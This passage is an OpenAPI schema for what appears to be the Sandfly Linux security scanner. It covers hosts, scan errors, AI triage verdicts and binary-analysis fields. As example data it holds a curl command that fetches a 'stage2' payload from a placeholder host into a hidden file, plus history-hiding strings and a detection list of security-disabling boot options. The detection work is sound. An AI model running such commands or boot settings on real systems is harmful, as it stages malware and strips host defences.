              type: array
        total:
          description: Total number of records returned in this page.
          format: int32
          type: integer
        more_results:
          description: Whether there are more results beyond this page.
          type: boolean
      type: object
    ErrorLogEntry:
      type: object
      required:
        - id
        - data
        - header
        - run_id
        - host_id
        - ip_addr
        - hostname
        - error_msg
        - queue_name
      properties:
        id:
          type: string
          description: Error log entry ID.
        data:
          type: string
          description: Error data
        header:
          type: object
          description: Information about the target host that a scan error pertains to
          required:
            - ssh
            - tags
            - ad_hoc
            - run_id
            - status
            - host_id
            - ip_addr
            - end_time
            - hostname
            - ssh_port
            - jump_hosts
            - queue_name
            - start_time
            - status_msg
            - manual_scan
            - credentials_id
            - verify_host_key
          properties:
            ssh:
              type: object
            tags:
              type: array
              items:
                type: string
              description: Host tags.
            ad_hoc:
              type: boolean
              description: Whether or not this was an ad-hoc scan request.
            run_id:
              type: string
              description: Scan run ID.
            status:
              type: string
              description: Overall result status.
            host_id:
              type: string
              description: Target host ID.
            ip_addr:
              type: string
              description: Target host IP address.
            end_time:
              type: string
              description: Time scan attempt ended.
            hostname:
              type: string
              description: Target host address.
            ssh_port:
              type: integer
              description: Target host SSH port number.
            jump_hosts:
              $ref: "#/components/schemas/LinkedJumpHosts"
            queue_name:
              type: string
              description: Scan queue name.
            start_time:
              type: string
              description: Start time of scan attempt.
            status_msg:
              type: string
              description: Scan status.
            manual_scan:
              type: boolean
              description: Indicates if this was a manual (as opposed to scheduled) scan.
            credentials_id:
              type: string
              description: Credential used to attempt to log on to target host.
            verify_host_key:
              type: boolean
              description: Indicates if SSH host key verification was requested.
        run_id:
          type: string
          description: Run ID of this scan.
        host_id:
          type: string
          description: Host ID of target host.
        ip_addr:
          type: string
          nullable: true
          description: Target host IP address, if known.
        hostname:
          type: string
          description: Target host address.
        error_msg:
          type: string
          description: Error message.
        queue_name:
          type: string
          description: Scan queue name.
    ErrorLogSummaryEntry:
      type: object
      required:
        - id
        - run_id
        - host_id
        - ip_addr
        - hostname
        - start_time
        - error_msg
        - queue_name
      properties:
        id:
          type: string
          description: Error entry ID.
        run_id:
          type: string
          description: Run ID of scan.
        start_time:
          type: string
          description: Scan start time.
        host_id:
          type: string
          description: Host ID of target host.
        ip_addr:
          type: string
          nullable: true
          description: IP address of target host, if known.
        hostname:
          type: string
          description: Target host address.
        error_msg:
          type: string
          description: Error message.
        queue_name:
          type: string
          nullable: true
          description: Scan queue name.
    FileSignal:
      type: string
      title: FileSignal
      description: Findings from a file.
      enum:
        - world-writable
        - size-mismatch
        - extension-mismatch
        - ctime-newer-than-mtime
      x-enumDescriptions:
        world-writable: Any user can replace this file.
        size-mismatch: The file's reported size does not match its actual contents, a sign of tampering.
        extension-mismatch: The file's contents do not match its name, such as a program named as an image.
        ctime-newer-than-mtime: The file's timestamps are inconsistent, a sign they were faked.
      x-enumSeverities:
        world-writable: 5
        size-mismatch: 5
        extension-mismatch: 5
        ctime-newer-than-mtime: 2
    Host:
      description: Host object containing what was discovered about a host as it was added to the system inventory.
      properties:
        active:
          title: Host.active
          description: Is this host active (valid credentials and login)? Maintained by Sandfly as hosts are scanned; it is not user-settable. Use POST /hosts/retry to have an inactive host checked again.
          type: boolean
        authentication_status:
          title: Host.authentication_status
          description: What is the state of the authentication? ok, failed, error
          type: string
        credentials_id:
          title: Host.credentials_id
          description: credentials_id to use for this host.
          type: string
        data:
          properties:
            explanation:
              title: Data.explanation
              type: string
          required:
            - explanation
          additionalProperties: false
          title: Data
          type: object
        date_first_seen:
          description: Date first saw this host.
          title: Host.date_first_seen
          nullable: true
          type: string
        date_last_seen:
          title: Host.date_last_seen
          description: Last time we saw this host.
          nullable: true
          type: string
        date_last_scan:
          title: Host.date_last_scan
          description: Last time we successfully connected to and authenticated to this host.
          nullable: true
          type: string
        override_directory:
          title: Host.override_directory
          description: Directory to run scan from instead of the node configuration values.
          type: string
        first_seen_ip_addr:
          title: Host.first_seen_ip_addr
          description: First IP address we saw for this host.
          nullable: true
          type: string
        host_id:
          title: Host.host_id
          description: A unique ID for this host (ssh key fingerprint), or the host_name if we saw no SSH.
          type: string
        host_sequence_id:
          title: Host.host_sequence_id
          description: Alternative integer ID assigned to this host.
          type: integer
        hostname:
          title: Host.hostname
          description: Hostname of host.
          type: string
        id:
          title: Host.id
          description: Alias for host_id.
          type: string
          deprecated: false
        jump_hosts:
          items:
            type: string
            title: Host.jump_hosts.[]
          title: Host.jump_hosts
          description: List of jump_host names for this host.
          type: array
        last_seen_ip_addr:
          title: Host.last_seen_ip_addr
          description: Last IP address we saw for this host.
          nullable: true
          type: string
        last_scan_duration_seconds:
          title: Last scan duration (seconds)
          description: Duration of last scan operation, in seconds.
          type: integer
          nullable: true
        os:
          title: Host.os
          description: Operating system data collected.
          $ref: "#/components/schemas/Os"
          nullable: true
        queue_name:
          title: Host.queue_name
          description: Queue name.
          type: string
        results:
          properties:
            alert:
              type: integer
              description: Total alert results on this host.
              minimum: 0
            alert_artifacts:
              type: integer
              description: Number of current alerting artifacts on this host. An artifact that more than one sandfly alerted on counts once, where `alert` counts each sandfly's alert.
              minimum: 0
            error:
              type: integer
              description: Total error results on this host.
              minimum: 0
            pass:
              type: integer
              description: Total pass results on this host.
              minimum: 0
            total:
              type: integer
              description: Total results on this host.
              minimum: 0
          required:
            - alert
            - alert_artifacts
            - error
            - pass
            - total
          additionalProperties: false
          title: Results
          type: object
        run_id:
          title: Host.run_id
          type: string
        ssh:
          properties:
            banner:
              title: Host.ssh.banner
              type: string
            keys:
              additionalProperties:
                properties:
                  bits:
                    title: Key.bits
                    type: integer
                  fingerprint:
                    title: Key.fingerprint
                    type: string
                  public_key:
                    title: Key.public_key
                    type: string
                  type:
                    title: Key.type
                    type: string
                required:
                  - bits
                  - fingerprint
                  - public_key
                  - type
                additionalProperties: false
                title: Key
                type: object
              title: Host.ssh.keys
              type: object
            negotiated_key_type:
              title: Host.ssh.negotiated_key_type
              type: string
            port:
              title: Host.ssh.port
              type: integer
          required:
            - banner
            - keys
            - negotiated_key_type
            - port
          additionalProperties: false
          title: Host.ssh
          type: object
        ssh_key_fingerprint:
          title: Host.ssh_key_fingerprint
          description: SSH fingerprint of remote host.
          nullable: true
          type: string
        ssh_port:
          title: Host.ssh_port
          description: SSH port for host.
          type: integer
          default: 22
        tags:
          items:
            title: Host.tags.[]
            type: string
          title: Host.tags
          description: A list of tags for this host.
          type: array
        verify_host_key:
          title: Host.verify_host_key
          description: Should we verify the host key?
          type: boolean
          default: false
        version:
          title: Host.version
          description: Version type for this record.
          type: integer
        severity:
          type: integer
          description: The host's severity, 0-5. When AI triage has analyzed the host, the analysis sets the severity. Otherwise it's the highest severity among the host's alerting artifacts or 0 when nothing is alerting.
          minimum: 0
          maximum: 5
        triage_verdict:
          type: string
          description: "The host's AI triage verdict: one of the six verdicts (the last one formed for the host, kept while a new one is queued or after a later attempt fails), `pending` for a host waiting for its first verdict, `error` for a host whose only attempt at a verdict failed, `excluded` for a host whose tags keep it out of automatic AI triage and which nobody has asked for a verdict on, or `none` for a host with no record and nothing queued."
          enum:
            - clean
            - likely_false_positive
            - needs_attention
            - suspicious
            - likely_malicious
            - likely_compromised
            - pending
            - error
            - excluded
            - none
        triage_stale:
          type: boolean
          description: "Whether the host's AI triage verdict is stale: true when a host materially changes and there isn't a new analysis yet. False for a host with no verdict. Not set by an operator's revert, which changes what the host reports rather than what is alerting on it."
        triage_queue_state:
          $ref: "#/components/schemas/HostTriageQueueState"
      required:
        - active
        - authentication_status
        - credentials_id
        - data
        - severity
        - triage_verdict
        - triage_stale
        - triage_queue_state
        - date_first_seen
        - date_last_seen
        - date_last_scan
        - first_seen_ip_addr
        - host_id
        - host_sequence_id
        - hostname
        - id
        - jump_hosts
        - last_seen_ip_addr
        - os
        - override_directory
        - queue_name
        - results
        - run_id
        - ssh
        - ssh_key_fingerprint
        - ssh_port
        - tags
        - verify_host_key
        - version
      additionalProperties: false
      title: Host
      type: object
    Hosts:
      type: array
      items:
        $ref: "#/components/schemas/Host"
      description: Array of host objects.
    HostBulkTag:
      type: object
      properties:
        host_ids:
          description: List of host IDs to perform the bulk tagging operation on.
          items:
            type: string
          type: array
        host_sequence_ids:
          description: List of host sequence IDs to perform the bulk tagging operation on.
          items:
            type: integer
          type: array
        tags:
          description: List of tags to add or remove to the hosts.
          items:
            type: string
          type: array
    BinaryAnalysis:
      type: object
      title: BinaryAnalysis
      description: What an ELF binary is, what it can do, and how likely it is to be malicious.
      required:
        - architecture
        - type
        - threat_score
        - threat_score_lr
        - threat_score_gbdt
      properties:
        interpreter:
          type: string
          description: The dynamic loader this program needs in order to run.
          example: /lib64/ld-linux-x86-64.so.2
        build_id:
          type: string
          description: Build identifier stamped into the file when it was compiled.
          example: e3e821472e2c1845f6039963981a5a927dabcac0
        comment:
          type: string
          description: Compiler version string left in the file.
          example: "GCC: (Debian 15.2.0-16) 15.2.0"
        architecture:
          $ref: "#/components/schemas/Architecture"
        type:
          $ref: "#/components/schemas/ElfType"
        properties:
          type: array
          description: How the binary is built and linked.
          items:
            $ref: "#/components/schemas/PropertyTag"
        hardening:
          type: array
          description: Exploit-mitigation protections built into the binary.
          items:
            $ref: "#/components/schemas/HardeningTag"
        hardening_missing:
          type: array
          description: Exploit-mitigation protections this binary does without.
          items:
            $ref: "#/components/schemas/HardeningTag"
        capabilities:
          type: array
          description: What the program is able to do. Common in legitimate software too.
          items:
            $ref: "#/components/schemas/CapabilityTag"
        suspicious:
          type: array
          description: Suspicious binary capabilities that warrant a closer look.
          items:
            $ref: "#/components/schemas/SuspiciousTag"
        anomalies:
          type: array
          description: Structural traits of the file that are out of the ordinary.
          items:
            $ref: "#/components/schemas/AnomalyTag"
        confirmed:
          type: array
          description: Specific network and execution behaviors identified in the program.
          items:
            $ref: "#/components/schemas/ConfirmedTag"
        exec_targets:
          type: array
          description: Commands and programs this binary runs, such as a shell or other external commands.
          items:
            type: string
          maxItems: 32
          example:
            - /bin/sh
            - /bin/sh -c "id; uname -a"
            - /usr/bin/curl -sL http://ip.address/stage2 -o /dev/shm/.x
        decoded_strings:
          type: array
          description: Strings the program hid with a simple XOR key, decoded, such as server names, file paths and commands. Present only with the encoded-strings-xor tag.
          items:
            type: string
          maxItems: 32
          example:
            - update.example.com
            - /lib/libntpVnQE6mk/.boot.sh
            - HISTFILE=/dev/null
        decode_keys_xor:
          type: array
          description: The XOR keys that hid the decoded strings, in hexadecimal.
          items:
            type: string
            pattern: ^0x[0-9a-f]{2}$
          example:
            - "0x37"
        counts:
          $ref: "#/components/schemas/BinaryCounts"
        suspicious_symbols:
          type: array
          description: Symbols that are suspiciously named and commonly found in malware or malware-like utilities.
          items:
            type: string
          maxItems: 20
        suspicious_syscalls:
          type: array
          description: System calls commonly used by malware.
          items:
            type: string
          maxItems: 20
        suspicious_strings:
          type: array
          description: Text found in the program that is commonly seen in malware.
          items:
            type: string
          maxItems: 20
        suspicious_exported_symbols:
          type: array
          description: Functions the program offers to others. This can be abused to hijack normal system behavior, such as with rootkits, or may be benign.
          items:
            type: string
          maxItems: 20
        imports:
          type: array
          description: Shared libraries the program loads.
          items:
            type: string
          example:
            - libssl.so.3
            - libcrypto.so.3
            - libc.so.6
        iocs:
          $ref: "#/components/schemas/BinaryIOCs"
        overlay:
          $ref: "#/components/schemas/BinaryOverlay"
        threat_score:
          type: integer
          minimum: 0
          maximum: 100
          description: Overall threat rating from 0 to 100. Higher means more likely malicious.
        threat_score_lr:
          type: integer
          minimum: 0
          maximum: 100
          description: Logistic Regression binary score.
        threat_score_gbdt:
          type: integer
          minimum: 0
          maximum: 100
          description: Gradient Boosted Decision Tree binary score.
        score_path:
          $ref: "#/components/schemas/ScorePath"
    BinaryEvidenceSignal:
      type: string
      title: BinaryEvidenceSignal
      description: Findings about the exploit-mitigation protections built into a program.
      enum:
        - weak-hardening
        - stripped-symbols
        - partial-relro
      x-enumDescriptions:
        weak-hardening: The program is built with almost none of the usual exploit protections.
        stripped-symbols: All symbol names have been removed, making the program harder to analyze.
        partial-relro: Only partial RELRO memory protection is in place.
      x-enumSeverities:
        weak-hardening: 2
        stripped-symbols: 2
        partial-relro: 0
    BootCmdlineToken:
      type: string
      title: BootCmdlineToken
      description: Kernel boot options that weaken the host and survive reboots.
      enum:
        - selinux=0
        - apparmor=0
        - enforcing=0
        - module.sig_enforce=0
        - nokaslr
        - init=/bin/sh
        - init=/bin/bash
        - audit=0
        - lockdown=none
        - mitigations=off
      x-enumDescriptions:
        selinux=0: SELinux disabled at boot. Persists across reboots.
        apparmor=0: AppArmor disabled at boot. Persists across reboots.
        enforcing=0: SELinux booted permissive. Persists across reboots.
        module.sig_enforce=0: Unsigned kernel modules are allowed to load. Persists across reboots.
        nokaslr: Kernel address randomisation disabled. Persists across reboots.
        init=/bin/sh: Boots straight to a root shell with no login required.
        init=/bin/bash: Boots straight to a root shell with no login required.
        audit=0: Kernel auditing disabled. Persists across reboots.
        lockdown=none: Kernel lockdown disabled. Persists across reboots.
        mitigations=off: CPU vulnerability mitigations disabled. Persists across reboots.
      x-enumSeverities:
        selinux=0: 5
        apparmor=0: 5
        enforcing=0: 5
        module.sig_enforce=0: 5
        nokaslr: 5
        init=/bin/sh: 5
        init=/bin/bash: 5
        audit=0: 2
        lockdown=none: 2
        mitigations=off: 2
    BulkTagOperation:
      type: string
      enum:
        - add
        - remove
